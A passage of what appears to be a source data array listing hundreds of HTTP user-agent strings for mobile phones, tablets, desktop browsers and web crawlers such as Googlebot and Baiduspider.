"Mozilla/5.0 (Linux; Android 6.0; vivo 1601) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.90 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 6.0.1; SM-G532F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 5.1; 5019D) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 8.1.0; TECNO KA7O) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 5.1; HUAWEI CUN-L21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 8.1.0; itel W5504) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 4.4.2; HUAWEI Y541-U02) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36",
"Mozilla/5.0 (iPhone; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/80.0.262003652 Mobile/17A577 Safari/604.1",
"Mozilla/5.0 (Linux; Android 7.1.1; SM-T550) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Safari/537.36",
"Mozilla/5.0 (Linux; Android 8.0.0; AGS2-L09) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Safari/537.36",
"Mozilla/5.0 (iPhone; CPU iPhone OS 12_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/77.0.3865.93 Mobile/15E148 Safari/605.1",
"Mozilla/5.0 (Linux; Android 9; LM-G810) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 7.0; DLI-TL20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.75 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 7.0; X-treme_PQ24) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36",
"Mozilla/5.0 (iPad; CPU OS 10_3_4 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) CriOS/69.0.3497.105 Mobile/14G61 Safari/602.1",
"Mozilla/5.0 (Linux; Android 8.1.0; TECNO LA7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 7.0; Infinix X559 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; MI 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36",
"Mozilla/5.0 (iPad; CPU OS 13_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/77.0.3865.93 Mobile/15E148 Safari/605.1",
"Mozilla/5.0 (Linux; Android 6.0; PMT3118_3G Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Safari/537.36 OPR/42.3.2246.113338",
"Mozilla/5.0 (Linux; Android 6.0.1; SM-G935F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 4.4.2; SM-T231) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Safari/537.36",
"Mozilla/5.0 (Linux; Android 5.0.1; GT-I9505) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.105 Mobile Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3021.84 Safari/537.36",
"Mozilla/5.0 (Linux; Android 4.4.4; Lenovo TAB 2 A10-70L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Safari/537.36",
"Mozilla/5.0 (Linux; Android 7.1.1; TA-1053) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36",
"Mozilla/5.0 (iPad; CPU OS 10_3_4 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) CriOS/67.0.3396.69 Mobile/14G61 Safari/602.1",
"Mozilla/5.0 (Linux; Android 9; SM-A600FN Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 YaBrowser/18.9.2.31.00 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 7.0; SM-J701F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36",
	"AdsBot-Google ( http://www.google.com/adsbot.html)",
	"Avant Browser/1.2.789rel1 (http://www.avantbrowser.com)",
	"Baiduspider ( http://www.baidu.com/search/spider.htm)",
	"BlackBerry7100i/4.1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/103",
	"BlackBerry7520/4.0.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Browser/5.0.3.3 UP.Link/5.1.2.12 (Google WAP Proxy/1.0)",
	"BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0",
	"BlackBerry8320/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/100",
	"BlackBerry8330/4.3.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/105",
	"BlackBerry9000/4.6.0.167 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/102",
	"BlackBerry9530/4.7.0.167 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/102 UP.Link/6.3.1.20.0",
	"BlackBerry9700/5.0.0.351 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/123",
	"Bloglines/3.1 (http://www.bloglines.com)",
	"CSSCheck/1.2.2",
	"Dillo/2.0",
	"DoCoMo/2.0 N905i(c100;TB;W24H16) (compatible; Googlebot-Mobile/2.1;  http://www.google.com/bot.html)",
	"DoCoMo/2.0 SH901iC(c100;TB;W24H12)",
	"Download Demon/3.5.0.11",
	"ELinks/0.12~pre5-4",
	"ELinks (0.4pre5; Linux 2.6.10-ac7 i686; 80x33)",
	"ELinks/0.9.3 (textmode; Linux 2.6.9-kanotix-8 i686; 127x41)",
	"EmailWolf 1.00",
	"everyfeed-spider/2.0 (http://www.everyfeed.com)",
	"facebookscraper/1.0( http://www.facebook.com/sharescraper_help.php)",
	"FAST-WebCrawler/3.8 (crawler at trd dot overture dot com; http://www.alltheweb.com/help/webmaster/crawler)",
	"FeedFetcher-Google; ( http://www.google.com/feedfetcher.html)",
	"Gaisbot/3.0 (robot@gais.cs.ccu.edu.tw; http://gais.cs.ccu.edu.tw/robot.php)",
	"Googlebot/2.1 ( http://www.googlebot.com/bot.html)",
	"Googlebot-Image/1.0",
	"Googlebot-News",
	"Googlebot-Video/1.0",
	"Gregarius/0.5.2 ( http://devlog.gregarius.net/docs/ua)",
	"grub-client-1.5.3; (grub-client-1.5.3; Crawl your own stuff with http://grub.org)",
	"Gulper Web Bot 0.2.4 (www.ecsl.cs.sunysb.edu/~maxim/cgi-bin/Link/GulperBot)",
	"HTC_Dream Mozilla/5.0 (Linux; U; Android 1.5; en-ca; Build/CUPCAKE) AppleWebKit/528.5  (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1",
	"HTC-ST7377/1.59.502.3 (67150) Opera/9.50 (Windows NT 5.1; U; en) UP.Link/6.3.1.17.0",
	"HTMLParser/1.6",
	"iTunes/4.2 (Macintosh; U; PPC Mac OS X 10.2)",
	"iTunes/9.0.2 (Windows; N)",
	"iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)",
	"Java/1.6.0_13",
	"Jigsaw/2.2.5 W3C_CSS_Validator_JFouffa/2.0",
	"Konqueror/3.0-rc4; (Konqueror/3.0-rc4; i686 Linux;;datecode)",
	"LG-GC900/V10a Obigo/WAP2.0 Profile/MIDP-2.1 Configuration/CLDC-1.1",
	"LG-LX550 AU-MIC-LX550/2.0 MMP/2.0 Profile/MIDP-2.0 Configuration/CLDC-1.1",
	"libwww-perl/5.820",
	"Links/0.9.1 (Linux 2.4.24; i386;)",
	"Links (2.1pre15; FreeBSD 5.3-RELEASE i386; 196x84)",
	"Links (2.1pre15; Linux 2.4.26 i686; 158x61)",
	"Links (2.3pre1; Linux 2.6.38-8-generic x86_64; 170x48)",
	"Lynx/2.8.5rel.1 libwww-FM/2.14 SSL-MM/1.4.1 GNUTLS/0.8.12",
	"Lynx/2.8.7dev.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8d",
	"Mediapartners-Google",
	"Microsoft URL Control - 6.00.8862",
	"Midori/0.1.10 (X11; Linux i686; U; en-us) WebKit/(531).(2) ",
	"MOT-L7v/08.B7.5DR MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0",
	"MOTORIZR-Z8/46.00.00 Mozilla/4.0 (compatible; MSIE 6.0; Symbian OS; 356) Opera 8.65 [it] UP.Link/6.3.0.0.0",
	"MOT-V177/0.1.75 UP.Browser/6.2.3.9.c.12 (GUI) MMP/2.0 UP.Link/6.3.1.13.0",
	"MOT-V9mm/00.62 UP.Browser/6.2.3.4.c.1.123 (GUI) MMP/2.0",
	"Mozilla/1.22 (compatible; MSIE 5.01; PalmOS 3.0) EudoraWeb 2.1",
	"Mozilla/2.02E (Win95; U)",
	"Mozilla/2.0 (compatible; Ask Jeeves/Teoma)",
	"Mozilla/3.01Gold (Win95; I)",
	"Mozilla/3.0 (compatible; NetPositive/2.1.1; BeOS)",
	"Mozilla/4.0 (compatible; GoogleToolbar 4.0.1019.5266-big; Windows XP 5.1; MSIE 6.0.2900.2180)",
	"Mozilla/4.0 (compatible; Linux 2.6.22) NetFront/3.4 Kindle/2.0 (screen 600x800)",
	"Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; MDA Pro/1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1)",
	"Mozilla/4.0 (compatible; MSIE 5.0; Series80/2.0 Nokia9500/4.51 Profile/MIDP-2.0 Configuration/CLDC-1.1)",
	"Mozilla/4.0 (compatible; MSIE 5.15; Mac_PowerPC)",
	"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98; Win 9x 4.90)",
	"Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0 )",
	"Mozilla/4.0 (compatible; MSIE 6.0; j2me) ReqwirelessWeb/3.5",
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; PalmSource/hspr-H102; Blazer/4.0) 16;320x320",
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.12; Microsoft ZuneHD 4.3)",
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; en) Opera 8.0",
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
	"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Avant Browser; Avant Browser; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)",
	"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; winfx; .NET CLR 1.1.4322; .NET CLR 2.0.50727; Zune 2.0) ",
	"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)",
	"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Trident/4.0)",
	"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Trident/5.0)",
	"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/6.0)",
	"Mozilla/4.0 (compatible; MSIE 7.0; Windows Phone OS 7.0; Trident/3.1; IEMobile/7.0) Asus;Galaxy6",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0)",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)",
	"Mozilla/4.0 (PDA; PalmOS/sony/model prmr/Revision:1.1.54 (en)) NetFront/3.0",
	"Mozilla/4.0 (PSP (PlayStation Portable); 2.00)",
	"Mozilla/4.1 (compatible; MSIE 5.0; Symbian OS; Nokia 6600;452) Opera 6.20 [en-US]",
	"Mozilla/4.77 [en] (X11; I; IRIX;64 6.5 IP30)",
	"Mozilla/4.8 [en] (Windows NT 5.1; U)",
	"Mozilla/4.8 [en] (X11; U; SunOS; 5.7 sun4u)",
	"Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1",
	"Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1",
	"Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20060702 SeaMonkey/1.5a",
	"Mozilla/5.0 (BlackBerry; U; BlackBerry 9800; en) AppleWebKit/534.1  (KHTML, Like Gecko) Version/6.0.0.141 Mobile Safari/534.1",
	"Mozilla/5.0 (compatible; bingbot/2.0  http://www.bing.com/bingbot.htm)",
	"Mozilla/5.0 (compatible; Exabot/3.0;  http://www.exabot.com/go/robot) ",
	"Mozilla/5.0 (compatible; Googlebot/2.1;  http://www.google.com/bot.html)",
	"Mozilla/5.0 (compatible; Konqueror/3.3; Linux 2.6.8-gentoo-r3; X11;",
	"Mozilla/5.0 (compatible; Konqueror/3.5; Linux 2.6.30-7.dmz.1-liquorix-686; X11) KHTML/3.5.10 (like Gecko) (Debian package 4:3.5.10.dfsg.1-1 b1)",
	"Mozilla/5.0 (compatible; Konqueror/3.5; Linux; en_US) KHTML/3.5.6 (like Gecko) (Kubuntu)",
	"Mozilla/5.0 (compatible; Konqueror/3.5; NetBSD 4.0_RC3; X11) KHTML/3.5.7 (like Gecko)",
	"Mozilla/5.0 (compatible; Konqueror/3.5; SunOS) KHTML/3.5.1 (like Gecko)",
	"Mozilla/5.0 (compatible; Konqueror/4.1; DragonFly) KHTML/4.1.4 (like Gecko)",
	"Mozilla/5.0 (compatible; Konqueror/4.1; OpenBSD) KHTML/4.1.4 (like Gecko)",
	"Mozilla/5.0 (compatible; Konqueror/4.2; Linux) KHTML/4.2.4 (like Gecko) Slackware/13.0",
	"Mozilla/5.0 (compatible; Konqueror/4.3; Linux) KHTML/4.3.1 (like Gecko) Fedora/4.3.1-3.fc11",
	"Mozilla/5.0 (compatible; Konqueror/4.4; Linux 2.6.32-22-generic; X11; en_US) KHTML/4.4.3 (like Gecko) Kubuntu",
	"Mozilla/5.0 (compatible; Konqueror/4.4; Linux) KHTML/4.4.1 (like Gecko) Fedora/4.4.1-1.fc12",
	"Mozilla/5.0 (compatible; Konqueror/4.5; FreeBSD) KHTML/4.5.4 (like Gecko)",
	"Mozilla/5.0 (compatible; Konqueror/4.5; NetBSD 5.0.2; X11; amd64; en_US) KHTML/4.5.4 (like Gecko)",
	"Mozilla/5.0 (compatible; Konqueror/4.5; Windows) KHTML/4.5.4 (like Gecko)",
	"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)",
	"Mozilla/5.0 (compatible; MSIE 10.6; Windows NT 6.1; Trident/5.0; InfoPath.2; SLCC1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 2.0.50727) 3gpp-gba UNTRUSTED/1.0",
	"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)",
	"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.2; Trident/5.0)",
	"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.2; WOW64; Trident/5.0)",
	"Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0)",
	"Mozilla/5.0 (compatible; Yahoo! Slurp China; http://misc.yahoo.com.cn/help.html)",
	"Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
	"Mozilla/5.0 (en-us) AppleWebKit/525.13 (KHTML, like Gecko; Google Web Preview) Version/3.1 Safari/525.13",
	"Mozilla/5.0 (hp-tablet; Linux; hpwOS/3.0.2; U; de-DE) AppleWebKit/534.6 (KHTML, like Gecko) wOSBrowser/234.40.1 Safari/534.6 TouchPad/1.0",
	"Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10",
	"Mozilla/5.0 (iPad; U; CPU OS 4_2_1 like Mac OS X; ja-jp) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5",
	"Mozilla/5.0 (iPad; U; CPU OS 4_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8F190 Safari/6533.18.5",
	"Mozilla/5.0 (iPhone; U; CPU iPhone OS 2_0 like Mac OS X; en-us) AppleWebKit/525.18.1 (KHTML, like Gecko) Version/3.1.1 Mobile/5A347 Safari/525.200",
	"Mozilla/5.0 (iPhone; U; CPU iPhone OS 3_0 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Version/4.0 Mobile/7A341 Safari/528.16",
	"Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_0 like Mac OS X; en-us) AppleWebKit/532.9 (KHTML, like Gecko) Version/4.0.5 Mobile/8A293 Safari/531.22.7",
	"Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_2_1 like Mac OS X; da-dk) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5",
	"Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3 like Mac OS X; de-de) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8F190",
	"Mozilla/5.0 (iPhone; U; CPU iPhone OS) (compatible; Googlebot-Mobile/2.1;  http://www.google.com/bot.html)",
	"Mozilla/5.0 (iPhone; U; CPU like Mac OS X; en) AppleWebKit/420  (KHTML, like Gecko) Version/3.0 Mobile/1A543a Safari/419.3",
	"Mozilla/5.0 (iPod; U; CPU iPhone OS 2_2_1 like Mac OS X; en-us) AppleWebKit/525.18.1 (KHTML, like Gecko) Version/3.1.1 Mobile/5H11a Safari/525.20",
	"Mozilla/5.0 (iPod; U; CPU iPhone OS 3_1_1 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Mobile/7C145",
	"Mozilla/5.0 (Linux; U; Android 0.5; en-us) AppleWebKit/522  (KHTML, like Gecko) Safari/419.3",
	"Mozilla/5.0 (Linux; U; Android 1.0; en-us; dream) AppleWebKit/525.10  (KHTML, like Gecko) Version/3.0.4 Mobile Safari/523.12.2",
	"Mozilla/5.0 (Linux; U; Android 1.1; en-gb; dream) AppleWebKit/525.10  (KHTML, like Gecko) Version/3.0.4 Mobile Safari/523.12.2",
	"Mozilla/5.0 (Linux; U; Android 1.5; de-ch; HTC Hero Build/CUPCAKE) AppleWebKit/528.5  (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1",
	"Mozilla/5.0 (Linux; U; Android 1.5; de-de; Galaxy Build/CUPCAKE) AppleWebKit/528.5  (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1",
	"Mozilla/5.0 (Linux; U; Android 1.5; de-de; HTC Magic Build/PLAT-RC33) AppleWebKit/528.5  (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1 FirePHP/0.3",
	"Mozilla/5.0 (Linux; U; Android 1.5; en-gb; T-Mobile_G2_Touch Build/CUPCAKE) AppleWebKit/528.5  (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1",
	"Mozilla/5.0 (Linux; U; Android 1.5; en-us; htc_bahamas Build/CRB17) AppleWebKit/528.5  (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1",
	"Mozilla/5.0 (Linux; U; Android 1.5; en-us; sdk Build/CUPCAKE) AppleWebkit/528.5  (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1",
	"Mozilla/5.0 (Linux; U; Android 1.5; en-us; SPH-M900 Build/CUPCAKE) AppleWebKit/528.5  (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1",
	"Mozilla/5.0 (Linux; U; Android 1.5; en-us; T-Mobile G1 Build/CRB43) AppleWebKit/528.5  (KHTML, like Gecko) Version/3.1.2 Mobile Safari 525.20.1",
	"Mozilla/5.0 (Linux; U; Android 1.5; fr-fr; GT-I5700 Build/CUPCAKE) AppleWebKit/528.5  (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1",
	"Mozilla/5.0 (Linux; U; Android 1.6; en-us; HTC_TATTOO_A3288 Build/DRC79) AppleWebKit/528.5  (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1",
	"Mozilla/5.0 (Linux; U; Android 1.6; en-us; SonyEricssonX10i Build/R1AA056) AppleWebKit/528.5  (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1",
	"Mozilla/5.0 (Linux; U; Android 1.6; es-es; SonyEricssonX10i Build/R1FA016) AppleWebKit/528.5  (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1",
	"Mozilla/5.0 (Linux; U; Android 2.0.1; de-de; Milestone Build/SHOLS_U2_01.14.0) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Mobile Safari/530.17",
	"Mozilla/5.0 (Linux; U; Android 2.0; en-us; Droid Build/ESD20) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Mobile Safari/530.17",
	"Mozilla/5.0 (Linux; U; Android 2.0; en-us; Milestone Build/ SHOLS_U2_01.03.1) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Mobile Safari/530.17",
	"Mozilla/5.0 (Linux; U; Android 2.1; en-us; HTC Legend Build/cupcake) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Mobile Safari/530.17",
	"Mozilla/5.0 (Linux; U; Android 2.1; en-us; Nexus One Build/ERD62) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Mobile Safari/530.17",
	"Mozilla/5.0 (Linux; U; Android 2.1-update1; de-de; HTC Desire 1.19.161.5 Build/ERE27) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Mobile Safari/530.17",
	"Mozilla/5.0 (Linux; U; Android 2.2; en-ca; GT-P1000M Build/FROYO) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
	"Mozilla/5.0 (Linux; U; Android 2.2; en-us; ADR6300 Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
	"Mozilla/5.0 (Linux; U; Android 2.2; en-us; Droid Build/FRG22D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
	"Mozilla/5.0 (Linux; U; Android 2.2; en-us; Nexus One Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
	"Mozilla/5.0 (Linux; U; Android 2.2; en-us; Sprint APA9292KT Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
	"Mozilla/5.0 (Linux; U; Android 2.3.4; en-us; BNTV250 Build/GINGERBREAD) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Safari/533.1",
	"Mozilla/5.0 (Linux; U; Android 3.0.1; en-us; GT-P7100 Build/HRI83) AppleWebkit/534.13 (KHTML, like Gecko) Version/4.0 Safari/534.13",
	"Mozilla/5.0 (Linux; U; Android 3.0.1; fr-fr; A500 Build/HRI66) AppleWebKit/534.13 (KHTML, like Gecko) Version/4.0 Safari/534.13",
	"Mozilla/5.0 (Linux; U; Android 3.0; en-us; Xoom Build/HRI39) AppleWebKit/525.10  (KHTML, like Gecko) Version/3.0.4 Mobile Safari/523.12.2",
	"Mozilla/5.0 (Linux; U; Android 4.0.3; de-ch; HTC Sensation Build/IML74K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
	"Mozilla/5.0 (Linux; U; Android 4.0.3; de-de; Galaxy S II Build/GRJ22) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
	"Mozilla/5.0 (Linux U; en-US)  AppleWebKit/528.5  (KHTML, like Gecko, Safari/528.5 ) Version/4.0 Kindle/3.0 (screen 600x800; rotate)",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.5; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.54 Safari/535.2",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Camino/2.2.1",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:2.0b6pre) Gecko/20100907 Firefox/4.0b6pre Camino/2.2a1pre",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:5.0) Gecko/20100101 Firefox/5.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:9.0) Gecko/20100101 Firefox/9.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_2) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.835.186 Safari/535.1",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/534.55.3 (KHTML, like Gecko) Version/5.1.3 Safari/534.53.10",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
	"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_6; en-US) AppleWebKit/528.16 (KHTML, like Gecko, Safari/528.16) OmniWeb/v622.8.0",
	"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7;en-us) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Safari/530.17",
	"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_8; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.302.2 Safari/532.8",
	"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.1) Gecko/20090624 Firefox/3.5",
	"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_2; en-us) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10",
	"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_4; en-US) AppleWebKit/534.3 (KHTML, like Gecko) Chrome/6.0.464.0 Safari/534.3",
	"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_5; de-de) AppleWebKit/534.15  (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4",
	"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_5; en-US) AppleWebKit/534.13 (KHTML, like Gecko) Chrome/9.0.597.15 Safari/534.13",
	"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; en-us) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27",
	"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; en-US; rv:1.9.2.14) Gecko/20110218 AlexaToolbar/alxf-2.0 Firefox/3.6.14",
	"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_7; en-us) AppleWebKit/534.20.8 (KHTML, like Gecko) Version/5.1 Safari/534.20.8",
	"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en-US) AppleWebKit/528.16 (KHTML, like Gecko, Safari/528.16) OmniWeb/v622.8.0.112941",
	"Mozilla/5.0 (Macintosh; U; Mac OS X Mach-O; en-US; rv:2.0a) Gecko/20040614 Firefox/3.0.0 ",
	"Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10.5; en-US; rv:1.9.0.3) Gecko/2008092414 Firefox/3.0.3",
	"Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10.5; en-US; rv:1.9.2.15) Gecko/20110303 Firefox/3.6.15",
	"Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/125.2 (KHTML, like Gecko) Safari/125.8",
	"Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/125.2 (KHTML, like Gecko) Safari/85.8",
	"Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/418.8 (KHTML, like Gecko) Safari/419.3",
	"Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.15",
	"Mozilla/5.0 (Macintosh; U; PPC Mac OS X; fr-fr) AppleWebKit/312.5 (KHTML, like Gecko) Safari/312.3",
